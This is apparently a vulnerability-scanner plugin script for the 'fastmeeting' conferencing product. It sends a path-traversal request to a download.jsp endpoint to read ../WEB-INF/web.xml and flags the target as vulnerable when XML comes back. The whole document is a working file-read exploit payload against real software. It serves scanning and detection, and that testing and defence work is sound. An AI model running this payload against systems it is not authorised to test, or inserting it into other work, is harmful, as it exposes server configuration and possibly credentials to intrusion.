#request url = var
#define payload = /dbbackup/adminMgr/download.jsp?fileName=../WEB-INF/web.xml
#define bug = application/xml
#define info = 存在fastmeeting_download_filedownload漏洞

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[1],bug,0)!= "-1")
	{
		print(url.info);
	}
}
